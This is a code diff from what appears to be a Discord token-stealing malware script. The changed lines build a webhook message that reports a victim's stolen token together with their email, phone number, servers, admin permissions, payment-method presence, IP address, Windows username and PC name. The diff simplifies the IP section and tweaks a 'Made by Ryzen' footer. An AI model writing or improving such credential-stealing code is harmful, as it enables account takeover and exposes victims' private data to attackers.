@@ -419,11 +419,10 @@ def main():
                         {
                             'title': f"**New user data: {res_json['username']}**",
                             'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {ip_data.get("ip")} | Type: {ip_data.get("type")} | Continent: {ip_data.get("continent")} ({ip_data.get("continent_code")}) | Country: {ip_data.get("country")} ({ip_data.get("country_code")}) | Region: {ip_data.get("region")} ({ip_data.get("region_code")}) | City: {ip_data.get("city")} | Postal: {ip_data.get("postal")} | Lat: {ip_data.get("latitude")} | Lon: {ip_data.get("longitude")} | EU: {ip_data.get("is_eu")} | Calling Code: {ip_data.get("calling_code")} | Capital: {ip_data.get("capital")} | Borders: {ip_data.get("borders")} | ASN: {ip_data.get("asn")} | Org: {ip_data.get("org")} | ISP: {ip_data.get("isp")} | Timezone: {ip_data.get("timezone")} | UTC Offset: {ip_data.get("timezone_offset")} | Currency: {ip_data.get("currency")} | Flag: {ip_data.get("flag")} | Emoji: {ip_data.get("emoji")}
-\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                             'color': 3092790,
                             'footer': {
-                                'text': "Made by Ryzen"
+                                'text': "Made By Ryzen"
                             },
                             'thumbnail': {
                                 'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
